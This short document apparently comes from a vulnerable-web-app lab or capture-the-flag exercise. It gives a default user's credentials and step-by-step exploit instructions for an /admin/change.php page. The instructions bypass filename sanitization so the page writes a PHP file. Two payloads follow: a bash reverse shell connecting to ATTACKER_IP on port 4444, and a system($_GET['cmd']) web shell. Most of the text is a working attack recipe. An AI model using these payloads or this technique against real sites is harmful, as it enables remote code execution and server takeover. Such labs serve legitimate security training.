The user present by default inside the website is (Username:Password):

**alice.williams@unidv.it:abc123** (the password is not used inside the website, you can ignore it)

You can inspect the directory and the files in */passwords*.

To exploit the vulnerability use the following payload inside the /admin/change.php page:

into Username: **alice.williams@unidv.it.ph.phpp** (.php gets sanitized to empty string thus simply obtaining .php after sanitization)

into New password: (RAW: is used to avoid MD5 hashing)
- **RAW:&lt;?php exec("/bin/bash -c 'exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done'");?>**
- **RAW:&lt;?php system($_GET['cmd']);?>**

The first gets a Reverse shell (make sure to edit the ATTACKER_IP), while the seconds allows you to put commands as 'cmd' get argument in each request.

Then access the file you have just created at */passwords/alice.williams@unidv.it.php* .